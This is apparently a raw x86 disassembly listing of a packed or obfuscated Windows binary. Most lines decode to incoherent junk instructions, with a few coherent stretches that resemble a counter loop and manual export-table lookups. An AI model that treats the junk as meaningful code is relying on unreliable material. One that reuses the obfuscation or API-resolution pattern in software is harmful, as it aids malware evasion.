  40ad62:	icebp  
  40ad63:	popf   
  40ad64:	pop    ecx
  40ad65:	push   es
  40ad66:	sbb    edi,DWORD PTR [ebx+0x5bf1b954]
  40ad6c:	lds    esp,FWORD PTR [esi+0x484c853b]
  40ad72:	inc    edx
  40ad73:	ja     0x40acf7
  40ad75:	and    al,0x37
  40ad77:	lea    edi,[ebx]
  40ad79:	sub    bh,dl
  40ad7b:	hlt    
  40ad7c:	js     0x40ad62
  40ad7e:	dec    esi
  40ad7f:	mov    ecx,0xa021a43c
  40ad84:	das    
  40ad85:	push   cs
  40ad86:	pop    eax
  40ad87:	mov    edx,0x5518a1fc
  40ad8c:	dec    eax
  40ad8d:	push   ds
  40ad8e:	mov    dh,0x9a
  40ad90:	rcl    edi,cl
  40ad92:	sub    DWORD PTR [eax+0x3c],edx
  40ad95:	sub    ebx,DWORD PTR es:[esi-0x6424bda1]
  40ad9c:	pusha  
  40ad9d:	push   es
  40ad9e:	push   ebp
  40ad9f:	mov    ch,0x1f
  40ada1:	shr    BYTE PTR [eax+0x26f7d5e1],0xf1
  40ada8:	(bad)  
  40adaa:	out    dx,al
  40adab:	inc    ecx
  40adac:	jnp    0x40ad71
  40adae:	jns    0x40ad89
  40adb0:	dec    ebx
  40adb1:	inc    eax
  40adb2:	div    BYTE PTR [edi+eiz*8-0x38f39d5e]
  40adb9:	xchg   esi,eax
  40adba:	iret   
  40adbb:	je     0x40ae13
  40adbd:	pop    edi
  40adbe:	mov    DWORD PTR [edx-0x7d],ebp
  40adc1:	mov    DWORD PTR [ebx-0x52f6f71e],edx
  40adc7:	fneni(8087 only) 
  40adc9:	xor    al,dh
  40adcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adcc:	sub    dh,dl
  40adce:	jno    0x40adfb
  40add0:	lahf   
  40add1:	jno    0x40ae18
  40add3:	jnp    0x40ae08
  40add5:	inc    edx
  40add6:	inc    ebp
  40add7:	xlat   BYTE PTR ds:[ebx]
  40add8:	sbb    eax,0x6847fb13
  40addd:	mov    ebx,0x7a1340bd
  40ade2:	sbb    ebp,edi
  40ade4:	xchg   esi,eax
  40ade5:	add    esp,DWORD PTR [eax-0x57]
  40ade8:	push   edi
  40ade9:	sub    eax,0x56969726
  40adee:	pop    ds
  40adef:	jo     0x40ada6
  40adf1:	in     eax,0x7e
  40adf3:	or     al,0xb0
  40adf5:	xor    eax,0xee794fba
  40adfa:	cli    
  40adfb:	pop    es
  40adfc:	nop
  40adfd:	not    BYTE PTR [ebx-0x6]
  40ae00:	(bad)  
  40ae01:	push   edi
  40ae02:	mov    bh,bh
  40ae04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae05:	xor    esp,edx
  40ae07:	or     esp,esp
  40ae09:	enter  0x4181,0x2a
  40ae0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae0e:	or     eax,0xd4d6e0ba
  40ae13:	sub    BYTE PTR ds:0xde0d6d9a,al
  40ae19:	and    bl,BYTE PTR [edx+eax*2-0x1cb11b72]
  40ae20:	les    eax,FWORD PTR [ecx+0x70f53f84]
  40ae26:	sti    
  40ae27:	xor    BYTE PTR [edi+0x18b6b581],dl
  40ae2d:	pop    edi
  40ae2e:	retf   0x8bf1
  40ae31:	jmp    DWORD PTR [ebx-0x6cdafd0d]
  40ae37:	inc    esp
  40ae38:	addr16 inc eax
  40ae3a:	dec    si
  40ae3c:	arpl   ax,di
  40ae3e:	xor    bl,BYTE PTR [ebp+esi*1-0x6c]
  40ae42:	add    eax,DWORD PTR [ecx+0x2617fb28]
  40ae48:	pop    ss
  40ae49:	xchg   dl,al
  40ae4b:	cli    
  40ae4c:	lea    edi,[edx-0x3e2c7495]
  40ae52:	push   ds
  40ae53:	pop    esp
  40ae54:	out    dx,eax
  40ae55:	mov    ds:0x798a7201,eax
  40ae5a:	fldcw  WORD PTR [edx+0x5b]
  40ae5d:	stos   BYTE PTR es:[edi],al
  40ae5e:	dec    edi
  40ae5f:	(bad)  
  40ae60:	jbe    0x40adee
  40ae62:	retf   
  40ae63:	loopne 0x40ae14
  40ae65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae66:	out    0xdb,eax
  40ae68:	fistp  DWORD PTR [ebx+0x2be6797e]
  40ae6e:	and    DWORD PTR [ebx-0x1],eax
  40ae71:	call   0x4907:0xaa4c1162
  40ae78:	lods   eax,DWORD PTR ds:[esi]
  40ae79:	cmp    DWORD PTR [ebp+0x7a],0x68
  40ae7d:	xchg   esp,eax
  40ae7e:	call   0xed33db29
  40ae83:	inc    eax
  40ae84:	in     eax,0xf0
  40ae86:	mov    eax,ds:0x57b37e42
  40ae8b:	jmp    0xad41:0xab2f78c3
  40ae92:	or     cl,cl
  40ae94:	cwde   
  40ae95:	adc    dh,BYTE PTR ss:[esi-0x4e]
  40ae99:	inc    ebp
  40ae9a:	in     al,dx
  40ae9b:	ds popf 
  40ae9d:	pop    ss
  40ae9e:	fld    DWORD PTR [edi-0x62600b53]
  40aea4:	mov    ds:0xdccd91e3,eax
  40aea9:	in     al,0x20
  40aeab:	push   eax
  40aeac:	sbb    DWORD PTR [ecx-0x2b],ecx
  40aeaf:	jg     0x40af23
  40aeb1:	stc    
  40aeb2:	inc    esp
  40aeb3:	mov    ebx,0x789107c0
  40aeb8:	mov    al,0x91
  40aeba:	add    BYTE PTR [ebx-0x470850d7],al
  40aec0:	and    eax,0xbd6b0cac
  40aec5:	push   0xfffffffa
  40aec7:	outs   dx,BYTE PTR ds:[esi]
  40aec8:	mov    ds:0x7efb0589,eax
  40aecd:	aad    0xc2
  40aecf:	jmp    0xf9da:0xfae6b882
  40aed6:	mov    ch,BYTE PTR [esi+0xa]
  40aed9:	sbb    ah,BYTE PTR [esi+ebp*1+0x67251b13]
  40aee0:	push   ecx
  40aee1:	out    0xef,al
  40aee3:	or     esp,edi
  40aee5:	jne    0x40af17
  40aee7:	push   ecx
  40aee8:	adc    eax,0x217939c4
  40aeed:	adc    DWORD PTR [edx+0x532cd690],edx
  40aef3:	fidiv  DWORD PTR [edi+eax*4-0x5d]
  40aef7:	leave  
  40aef8:	fidivr WORD PTR [ebx-0x4e]
  40aefb:	iret   
  40aefc:	xchg   esi,eax
  40aefd:	sbb    al,bh
  40aeff:	les    eax,FWORD PTR [bx+di]
  40af02:	or     dl,BYTE PTR [edx+0x35ca76e2]
  40af08:	jp     0x40aeeb
  40af0a:	scas   eax,DWORD PTR es:[edi]
  40af0b:	xor    eax,0xa68f6533
  40af10:	add    DWORD PTR [edx],esp
  40af12:	call   DWORD PTR [edx-0x19]
  40af15:	rcl    BYTE PTR [ebp+0x24],0xe7
  40af19:	adc    DWORD PTR [eax],0xa4b5aec2
  40af1f:	mov    ecx,DWORD PTR [ecx]
  40af21:	shl    al,1
  40af23:	lahf   
  40af24:	pop    ebp
  40af25:	add    esp,ecx
  40af27:	add    eax,0xe3bd8024
  40af2c:	add    DWORD PTR [ecx+ebp*4-0x6710b7bb],edi
  40af33:	pop    edx
  40af34:	pop    edi
  40af35:	adc    cl,BYTE PTR [edx-0x10]
  40af38:	mov    ah,0x37
  40af3a:	es clc 
  40af3c:	pusha  
  40af3d:	adc    esp,esp
  40af3f:	xchg   esi,eax
  40af40:	lahf   
  40af41:	pop    ds
  40af42:	adc    BYTE PTR [edi-0x40812b21],0xc
  40af49:	sbb    edx,DWORD PTR [edx]
  40af4b:	repnz scas al,BYTE PTR es:[edi]
  40af4d:	addr16 add eax,0x28f11c72
  40af53:	xchg   ebp,eax
  40af54:	mov    ds,WORD PTR [edx+0x23d44492]
  40af5a:	arpl   cx,ax
  40af5c:	sar    DWORD PTR [edx],cl
  40af5e:	fs dec eax
  40af60:	jl     0x40afa7
  40af62:	shl    BYTE PTR [eax-0x1e],cl
  40af65:	adc    BYTE PTR [ebx],bh
  40af67:	add    edi,esp
  40af69:	adc    al,0x17
  40af6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af6c:	imul   esp,DWORD PTR [esi],0x8bf38e1c
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	sbb    BYTE PTR ds:0xf764d3ca,0x7e
  40b01e:	jle    0x40b058
  40b020:	jl     0x40b0a0
  40b022:	jle    0x40b065
  40b024:	sub    dl,BYTE PTR [ecx-0x601ed1b0]
  40b02a:	bound  ecx,QWORD PTR [ebx]
  40b02c:	jmp    0x8c8d:0xa45d3628
  40b033:	cmc    
  40b034:	xchg   esp,eax
  40b035:	fild   QWORD PTR [ebp+0x4f51bcf6]
  40b03b:	push   cs
  40b03c:	std    
  40b03d:	inc    edx
  40b03e:	push   ss
  40b03f:	fcmovu st,st(4)
  40b041:	ss aas 
  40b043:	test   BYTE PTR [edi+0x7322b671],cl
  40b049:	add    edx,eax
  40b04b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b04c:	and    dl,BYTE PTR [esi]
  40b04e:	scas   al,BYTE PTR es:[edi]
  40b04f:	rcl    ecx,0xa8
  40b052:	iret   
  40b053:	test   eax,0xc5d1c93d
  40b058:	or     edx,ebp
  40b05a:	lea    esi,[esi-0x4]
  40b05d:	jae    0x40b0c3
  40b05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b060:	ja     0x40b0b4
  40b062:	cld    
  40b063:	(bad)  
  40b064:	das    
  40b065:	inc    ebx
  40b066:	sub    ah,BYTE PTR [esi+0x581152d1]
  40b06c:	and    DWORD PTR [ebx+0x7b],edi
  40b06f:	mov    dh,0x64
  40b071:	xor    dh,BYTE PTR gs:[edi+0x14bd0f75]
  40b078:	push   0x1d
  40b07a:	push   0x71
  40b07c:	push   0x62
  40b07e:	das    
  40b07f:	retf   0x7f81
  40b082:	mov    WORD PTR [edi+0xc],fs
  40b085:	bound  esi,QWORD PTR [ecx*8+0x22a3e8e8]
  40b08c:	jge    0x40b0fc
  40b08e:	jmp    0x5f5e:0x5b184105
  40b095:	sbb    eax,0x1cac6797
  40b09a:	test   al,0xc1
  40b09c:	test   eax,0x521dd511
  40b0a1:	fst    QWORD PTR [esi]
  40b0a3:	outs   dx,DWORD PTR ds:[esi]
  40b0a4:	jg     0x40b0e0
  40b0a6:	scas   eax,DWORD PTR es:[edi]
  40b0a7:	and    ebx,ebp
  40b0a9:	and    BYTE PTR [esi],bh
  40b0ab:	pop    eax
  40b0ac:	gs jge 0x40b079
  40b0af:	neg    BYTE PTR [ecx]
  40b0b1:	push   ebx
  40b0b2:	mov    eax,ds:0x5b51a7b3
  40b0b7:	int    0x74
  40b0b9:	add    BYTE PTR [esi-0x306fbbc6],bh
  40b0bf:	jae    0x40b041
  40b0c1:	mov    bl,ch
  40b0c3:	mov    al,0xec
  40b0c5:	arpl   WORD PTR [edx],di
  40b0c7:	adc    DWORD PTR [edx],ebx
  40b0c9:	sar    bl,0x47
  40b0cc:	(bad)  
  40b0cd:	adc    BYTE PTR [edi],ah
  40b0cf:	sbb    ah,BYTE PTR [ebx+0x239367d3]
  40b0d5:	pop    esi
  40b0d6:	inc    ebp
  40b0d7:	leave  
  40b0d8:	aad    0xe6
  40b0da:	mov    dl,0x30
  40b0dc:	push   esp
  40b0dd:	pop    ds
  40b0de:	mov    al,0x2
  40b0e0:	push   esp
  40b0e1:	pushf  
  40b0e2:	inc    esp
  40b0e3:	sbb    dh,BYTE PTR [eax-0x2d]
  40b0e6:	push   ecx
  40b0e7:	cs es push eax
  40b0ea:	sahf   
  40b0eb:	cmp    edx,DWORD PTR ds:0x9d1fed9f
  40b0f1:	gs pop ebx
  40b0f3:	add    eax,0xfe15309c
  40b0f8:	ja     0x40b0ed
  40b0fa:	dec    esp
  40b0fb:	push   es
  40b0fc:	int3   
  40b0fd:	push   esi
  40b0fe:	addr16 dec edx
  40b100:	iret   
  40b101:	nop
  40b102:	push   ebp
  40b103:	repnz xor ch,bh
  40b106:	jnp    0x40b105
  40b108:	shl    BYTE PTR [edi+0x7b95cbbc],cl
  40b10e:	fistp  QWORD PTR [edx+0x6441c00a]
  40b114:	test   BYTE PTR [edx+0x528667e1],dh
  40b11a:	movq   mm4,QWORD PTR [edx-0x6e0124b7]
  40b121:	aam    0xf6
  40b123:	dec    ebx
  40b124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b125:	sub    cl,bl
  40b127:	mov    ?,WORD PTR [esp+eax*8+0xfc8ab3e]
  40b12e:	std    
  40b12f:	sub    al,0x92
  40b131:	test   BYTE PTR [ecx],bh
  40b133:	sub    bh,al
  40b135:	(bad)  
  40b136:	fist   WORD PTR [eax]
  40b138:	push   ebp
  40b139:	push   ds
  40b13a:	into   
  40b13b:	jne    0x40b12b
  40b13d:	sbb    al,bl
  40b13f:	mov    ecx,0x12b13eb8
  40b144:	rdtsc  
  40b146:	aam    0xd1
  40b148:	and    al,0xd5
  40b14a:	dec    ecx
  40b14b:	shl    DWORD PTR [esi+0x46],0x8b
  40b14f:	clc    
  40b150:	dec    ebx
  40b151:	jle    0x40b10c
  40b153:	push   edi
  40b154:	hlt    
  40b155:	fld    TBYTE PTR [edi]
  40b157:	add    al,cl
  40b159:	jae    0x40b1b7
  40b15b:	das    
  40b15c:	imul   BYTE PTR [edx-0x1d]
  40b15f:	sub    BYTE PTR [eax-0x24],dh
  40b162:	mov    esi,0x1f032dad
  40b167:	outs   dx,BYTE PTR ds:[esi]
  40b168:	outs   dx,DWORD PTR ds:[esi]
  40b169:	iret   
  40b16a:	push   ecx
  40b16b:	xchg   BYTE PTR [ecx-0x64],ch
  40b16e:	cmp    bh,BYTE PTR [ecx-0x59cef232]
  40b174:	retf   0xe5a2
  40b177:	gs lahf 
  40b179:	xor    edx,esp
  40b17b:	sbb    bl,ah
  40b17d:	push   eax
  40b17e:	das    
  40b17f:	gs pop edx
  40b181:	mov    esp,0xeeb8889d
  40b186:	inc    ebp
  40b187:	push   cs
  40b188:	outs   dx,DWORD PTR ds:[esi]
  40b189:	cs mov ch,0xbf
  40b18c:	ins    BYTE PTR es:[edi],dx
  40b18d:	pop    ecx
  40b18e:	(bad)  
  40b18f:	xor    cl,BYTE PTR [ebx+eiz*2]
  40b192:	xor    al,0x4c
  40b194:	loop   0x40b1b7
  40b196:	dec    eax
  40b197:	test   eax,0xc6775eae
  40b19c:	stc    
  40b19d:	mov    edx,edi
  40b19f:	retf   
  40b1a0:	push   ecx
  40b1a1:	es or  eax,ebp
  40b1a4:	fwait
  40b1a5:	sti    
  40b1a6:	or     cl,BYTE PTR [edi-0x3a]
  40b1a9:	leave  
  40b1aa:	out    dx,eax
  40b1ab:	(bad)  
  40b1ac:	mov    ch,0x9b
  40b1ae:	aam    0x70
  40b1b0:	sbb    al,0x68
  40b1b2:	idiv   DWORD PTR [ebp-0x602b62c2]
  40b1b8:	push   esp
  40b1b9:	imul   edi,DWORD PTR [esp+eiz*2+0x12],0x67
  40b1be:	jae    0x40b165
  40b1c0:	lea    edx,[ecx]
  40b1c2:	test   al,0x63
  40b1c4:	and    BYTE PTR [ebx+esi*8-0x3d],al
  40b1c8:	adc    esp,esi
  40b1ca:	and    ebp,DWORD PTR [eax-0x54ad8fc1]
  40b1d0:	jb     0x40b24b
  40b1d2:	ins    BYTE PTR es:[edi],dx
  40b1d3:	test   DWORD PTR [esi],edi
  40b1d5:	imul   eax,DWORD PTR fs:[ebx],0x69
  40b1d9:	cmp    DWORD PTR [edi+0x28241f77],edx
  40b1df:	gs jmp 0xb776:0x4be92d0
  40b1e7:	test   eax,0x8ea853b5
  40b1ec:	xlat   BYTE PTR ds:[ebx]
  40b1ed:	add    al,0xa9
  40b1ef:	push   ds
  40b1f0:	outs   dx,DWORD PTR ds:[esi]
  40b1f1:	sub    DWORD PTR [esi-0x16e7040d],edi
  40b1f7:	mov    ah,0xf3
  40b1f9:	(bad)  
  40b1fa:	ds sub eax,0x78bf7b90
  40b200:	xchg   BYTE PTR [eax],bl
  40b202:	fnstsw WORD PTR [esi+eiz*2-0x214e0935]
  40b209:	cmp    eax,DWORD PTR [edi+0x3a]
  40b20c:	cmp    eax,0x7a24d8ad
  40b211:	add    DWORD PTR [ebx+0x4070a1c5],ebx
  40b217:	inc    eax
  40b218:	popf   
  40b219:	jl     0x40b19c
  40b21b:	loop   0x40b234
  40b21d:	mov    eax,0xc7466c6
  40b222:	pop    ecx
  40b223:	repnz loope 0x40b21a
  40b226:	sbb    eax,0x777c0de9
  40b22b:	pop    ebp
  40b22c:	sbb    BYTE PTR [edi+esi*2],bh
  40b22f:	cmp    ah,bh
  40b231:	cli    
  40b232:	xchg   ecx,eax
  40b233:	push   esp
  40b234:	xor    BYTE PTR [eax+0x8],dl
  40b237:	scas   al,BYTE PTR es:[edi]
  40b238:	sub    BYTE PTR [ebx-0xf3c4003],0xfc
  40b23f:	dec    edi
  40b240:	xor    DWORD PTR [edi+0x69],ecx
  40b243:	icebp  
  40b244:	int    0xcd
  40b246:	mov    edx,DWORD PTR [edi-0x63]
  40b249:	nop
  40b24a:	in     al,0x68
  40b24c:	push   0xffffffa8
  40b24e:	sub    BYTE PTR [esi+0x48],bl
  40b251:	mov    WORD PTR [edi+0x17],fs
  40b254:	mov    esp,0x1c4a81f6
  40b259:	aam    0x26
  40b25b:	aaa    
  40b25c:	popf   
  40b25d:	xchg   ecx,eax
  40b25e:	bswap  ebx
  40b260:	repnz adc cl,BYTE PTR [edx]
  40b263:	repz aaa 
  40b265:	inc    ebp
  40b266:	fimul  DWORD PTR [eax]
  40b268:	mov    eax,ds:0x8bec458b
  40b26d:	dec    ebp
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	and    eax,0x2e069990
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	out    0x58,al
  40b291:	mov    eax,0x98143dd
  40b296:	inc    ecx
  40b297:	jmp    0x4174f09d
  40b29c:	imul   ebp,DWORD PTR [esi],0xffffffb1
  40b29f:	sub    esi,edi
  40b2a1:	sub    esi,0x873dc1d0
  40b2a7:	pop    es
  40b2a8:	xchg   ecx,eax
  40b2a9:	pushf  
  40b2aa:	neg    DWORD PTR [ebx+0x6265b2a4]
  40b2b0:	jge    0x40b330
  40b2b2:	or     cl,BYTE PTR [edi+ebp*8-0x46]
  40b2b6:	pop    esp
  40b2b7:	aas    
  40b2b8:	or     edi,edx
  40b2ba:	out    0x41,eax
  40b2bc:	dec    ecx
  40b2bd:	push   es
  40b2be:	(bad)  
  40b2bf:	xor    DWORD PTR [edx-0x68d0625c],esp
  40b2c5:	cdq    
  40b2c6:	dec    ecx
  40b2c7:	push   esp
  40b2c8:	daa    
  40b2c9:	add    DWORD PTR [eax+0x6cb8557f],0xb5b4bc82
  40b2d3:	mov    ds:0xb463531f,al
  40b2d8:	add    edi,DWORD PTR [ecx+0x6e]
  40b2db:	cmp    BYTE PTR [ebx],al
  40b2dd:	call   0xade4eb5c
  40b2e2:	or     eax,0x40000dc4
  40b2e7:	mov    esp,0xbcc44368
  40b2ec:	test   DWORD PTR [ecx+ecx*1],ebp
  40b2ef:	adc    DWORD PTR [ecx],ebp
  40b2f1:	jg     0x40b2e6
  40b2f3:	in     eax,0xb0
  40b2f5:	pop    edx
  40b2f6:	sbb    al,0x8a
  40b2f8:	mov    cl,0xbc
  40b2fa:	popf   
  40b2fb:	popf   
  40b2fc:	cld    
  40b2fd:	mov    al,ds:0x5cb9a43e
  40b302:	sub    bl,bh
  40b304:	and    BYTE PTR [ebx+esi*4],dh
  40b307:	lock push ecx
  40b309:	pop    esi
  40b30a:	mov    cl,0x47
  40b30c:	inc    ebp
  40b30d:	push   ss
  40b30e:	pop    edx
  40b30f:	(bad)  
  40b310:	sar    DWORD PTR [edx-0x32],cl
  40b313:	mov    al,0x6d
  40b315:	jle    0x40b388
  40b317:	(bad)  
  40b318:	jb     0x40b2cb
  40b31a:	in     eax,0xb5
  40b31c:	stc    
  40b31d:	add    DWORD PTR [edi+eiz*4-0x14],edx
  40b321:	(bad)  
  40b322:	sub    edx,DWORD PTR [edx-0x6836dba0]
  40b328:	ret    
  40b329:	push   ebx
  40b32a:	(bad)  
  40b32c:	pop    ss
  40b32d:	sub    eax,0xfc082f12
  40b332:	int3   
  40b333:	add    eax,0xdb8bbd76
  40b338:	adc    DWORD PTR [esi+0x5f46ffd],ecx
  40b33e:	jge    0x40b314
  40b340:	fstp   DWORD PTR [eax+edx*4]
  40b343:	(bad)  
  40b344:	sbb    edx,eax
  40b346:	and    BYTE PTR [ecx-0x5d],0xd2
  40b34a:	fcmovnb st,st(2)
  40b34c:	mov    ecx,0x4be7f788
  40b351:	cmc    
  40b352:	gs data16 loop 0x40b305
  40b356:	mov    ch,0xd9
  40b358:	sbb    BYTE PTR [edi],ah
  40b35a:	aam    0x1a
  40b35c:	lods   al,BYTE PTR ds:[esi]
  40b35d:	lods   al,BYTE PTR ds:[esi]
  40b35e:	(bad)  
  40b35f:	mov    eax,ds:0xfbdb3b0a
  40b364:	(bad)  
  40b365:	mov    esi,0xfa9ff81a
  40b36a:	leave  
  40b36b:	test   eax,0xce5a089c
  40b370:	lds    eax,FWORD PTR [ebx+0x46]
  40b373:	pop    esi
  40b374:	test   DWORD PTR [edi+0x75],edx
  40b377:	scas   al,BYTE PTR es:[edi]
  40b378:	dec    edi
  40b379:	sub    DWORD PTR [edi],edi
  40b37b:	aas    
  40b37c:	(bad)  
  40b37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b37e:	mov    al,0x31
  40b380:	shl    BYTE PTR [ecx],0x23
  40b383:	adc    al,0x4
  40b385:	lahf   
  40b386:	jne    0x40b362
  40b388:	inc    ebp
  40b389:	push   es
  40b38a:	sbb    dh,BYTE PTR [ebx-0x35]
  40b38d:	jl     0x40b356
  40b38f:	xor    eax,ebx
  40b391:	push   cs
  40b392:	jge    0x40b36f
  40b394:	mov    ds:0x809bf01c,al
  40b399:	xchg   BYTE PTR [eax],ah
  40b39b:	xor    DWORD PTR [edx+esi*4-0x4a],ebx
  40b39f:	cmc    
  40b3a0:	xchg   edi,eax
  40b3a1:	xor    al,0xfb
  40b3a3:	mov    BYTE PTR [esi],bl
  40b3a5:	fstp   DWORD PTR [edi+0x50230874]
  40b3ab:	jbe    0x40b406
  40b3ad:	loope  0x40b378
  40b3af:	or     BYTE PTR [edx],0xe2
  40b3b2:	das    
  40b3b3:	jne    0x40b36c
  40b3b5:	or     ecx,DWORD PTR [eax]
  40b3b7:	or     eax,0xf7739de5
  40b3bc:	mov    edx,DWORD PTR [edi+0x67]
  40b3bf:	in     al,dx
  40b3c0:	ja     0x40b379
  40b3c2:	jle    0x40b39f
  40b3c4:	(bad)  
  40b3c6:	sub    eax,0x468ad4fb
  40b3cb:	jp     0x40b36f
  40b3cd:	shl    DWORD PTR [ebx-0x12],cl
  40b3d0:	das    
  40b3d1:	inc    ebx
  40b3d2:	int3   
  40b3d3:	jnp    0x40b411
  40b3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3d6:	and    dl,ch
  40b3d8:	iret   
  40b3d9:	jg     0x40b3ad
  40b3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3dc:	jmp    0x40b412
  40b3de:	mov    al,ds:0xb0c80fee
  40b3e3:	mov    esi,DWORD PTR [ebx]
  40b3e5:	cli    
  40b3e6:	mov    BYTE PTR [esi],al
  40b3e8:	dec    edi
  40b3e9:	out    0xec,al
  40b3eb:	add    ebp,edi
  40b3ed:	jmp    0x6b13:0x248dae54
  40b3f4:	out    dx,eax
  40b3f5:	lahf   
  40b3f6:	nop
  40b3f7:	int3   
  40b3f8:	(bad)  
  40b3f9:	mov    cl,0x3a
  40b3fb:	(bad)  
  40b3fc:	out    0x0,al
  40b3fe:	mov    dh,0x2
  40b400:	ins    BYTE PTR es:[edi],dx
  40b401:	test   BYTE PTR [edx+0x78],bl
  40b404:	dec    ebx
  40b405:	xabort 0x65
  40b408:	dec    ecx
  40b409:	inc    ebp
  40b40a:	inc    esi
  40b40b:	and    cl,BYTE PTR ds:0x67356896
  40b411:	nop
  40b412:	jg     0x40b420
  40b414:	mov    bh,0x32
  40b416:	push   edx
  40b417:	int    0x82
  40b419:	int    0xa3
  40b41b:	xor    esp,eax
  40b41d:	jge    0x40b471
  40b41f:	das    
  40b420:	cmp    BYTE PTR [ecx],dh
  40b422:	pusha  
  40b423:	add    dl,BYTE PTR [esi]
  40b425:	inc    ebp
  40b426:	aad    0xb9
  40b428:	inc    edi
  40b429:	mov    es,esp
  40b42b:	stc    
  40b42c:	or     al,0x7d
  40b42e:	ror    BYTE PTR [ecx-0x1b],0x32
  40b432:	mov    DWORD PTR [esi],0xe3794396
  40b438:	mov    dl,0x58
  40b43a:	xchg   esi,eax
  40b43b:	test   eax,0x115a206a
  40b440:	imul   esp,ecx,0xffffffb2
  40b443:	add    eax,0x2ff29053
  40b448:	ds dec ebp
  40b44a:	mov    ecx,0x8aae5f96
  40b44f:	hlt    
  40b450:	adc    al,0x3b
  40b452:	(bad)  
  40b454:	dec    ebp
  40b455:	and    DWORD PTR [edi],0xe0647673
  40b45b:	fcomp  DWORD PTR [esi-0x569cd014]
  40b461:	adc    DWORD PTR [ebx+0xbadb6e],esi
  40b467:	retf   0x8659
  40b46a:	sub    bl,BYTE PTR [esi+eiz*1-0x3b]
  40b46e:	test   BYTE PTR ds:0x6e157550,bh
  40b474:	js     0x40b4e6
  40b476:	test   al,0x12
  40b478:	fidivr WORD PTR [ecx]
  40b47a:	iret   
  40b47b:	pop    eax
  40b47c:	jl     0x40b4f2
  40b47e:	jg     0x40b475
  40b480:	es jp  0x40b4e5
  40b483:	stc    
  40b484:	dec    eax
  40b485:	retf   0x50e0
  40b488:	int    0xb3
  40b48a:	das    
  40b48b:	test   eax,0x361fedfc
  40b491:	push   ss
  40b492:	mov    edi,0x77dae367
  40b497:	cmp    bl,BYTE PTR [ecx-0x2a]
  40b49a:	out    dx,al
  40b49b:	repnz repnz fdivr QWORD PTR [ebx+edx*4]
  40b4a0:	stos   BYTE PTR es:[edi],al
  40b4a1:	out    dx,al
  40b4a2:	cmp    DWORD PTR [edi+ebx*8],0x15
  40b4a6:	push   eax
  40b4a7:	ins    DWORD PTR es:[edi],dx
  40b4a8:	push   ds
  40b4a9:	dec    ecx
  40b4aa:	nop
  40b4ab:	or     al,0x28
  40b4ad:	add    al,BYTE PTR [eax+0x580b693d]
  40b4b3:	add    ebp,0x3d
  40b4b6:	fild   WORD PTR [esi+ebp*8]
  40b4b9:	inc    ebx
  40b4ba:	daa    
  40b4bb:	add    BYTE PTR [ecx+0x52],dh
  40b4be:	rol    DWORD PTR [edx+0x13b7fee6],1
  40b4c4:	cmp    eax,0x140a9772
  40b4c9:	dec    eax
  40b4ca:	push   edx
  40b4cb:	push   edi
  40b4cc:	icebp  
  40b4cd:	and    dh,BYTE PTR [ebx-0x1c]
  40b4d0:	or     BYTE PTR [edi+edi*2],0xbf
  40b4d4:	jbe    0x40b45f
  40b4d6:	dec    ebp
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	pop    ecx
